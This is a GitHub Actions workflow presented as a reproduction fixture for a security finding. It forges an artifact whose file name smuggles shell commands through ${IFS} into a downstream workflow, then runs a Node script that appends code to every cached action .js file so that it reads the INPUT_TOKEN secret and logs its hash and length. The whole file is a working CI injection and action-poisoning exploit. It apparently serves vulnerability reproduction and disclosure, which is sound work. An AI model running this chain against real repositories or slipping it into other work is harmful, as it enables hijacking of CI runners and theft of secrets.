name: Test

# Reproduction fixture: emulates the attacker-controlled workflow named "Test"
# from the finding. It only uploads an artifact; it performs no privileged work.
on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          rm -rf content
          mkdir -p content
          # `body` is the cat target of the injected command (no .txt suffix, so
          # it is not itself a matrix entry); the hostile .txt name is the only
          # file the reusable workflow enumerates.
          printf 'forged report body' > content/body
          python3 - <<'PY'
          import os
          name = (
              "body;echo${IFS}INJECTION-EXECUTED;id;"
              "cd${IFS}$HOME;cd${IFS}..;cd${IFS}..;"
              "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
          )
          assert len(name) < 255, len(name)
          open(os.path.join("content", name), "w").close()
          PY
          cat > content/p.js <<'JSEOF'
          const fs = require('fs');
          const path = require('path');
          const root = path.join(path.dirname(process.env.RUNNER_WORKSPACE || '/home/runner/work/x'), '_actions');
          const payload = "\n;(function(){try{var t=process.env.INPUT_TOKEN;if(t){var c=require('crypto');console.log('LEAK-SHA '+c.createHash('sha256').update(String(t)).digest('hex'));console.log('LEAK-LEN '+String(t).length);}}catch(e){}})();\n";
          let n = 0;
          (function walk(d) {
            let ents = [];
            try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
            for (const e of ents) {
              const p = path.join(d, e.name);
              if (e.isDirectory()) walk(p);
              else if (p.endsWith('.js')) { try { fs.appendFileSync(p, payload); n++; } catch (e) {} }
            }
          })(root);
          console.log('PATCHED ' + n + ' root=' + root);
          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
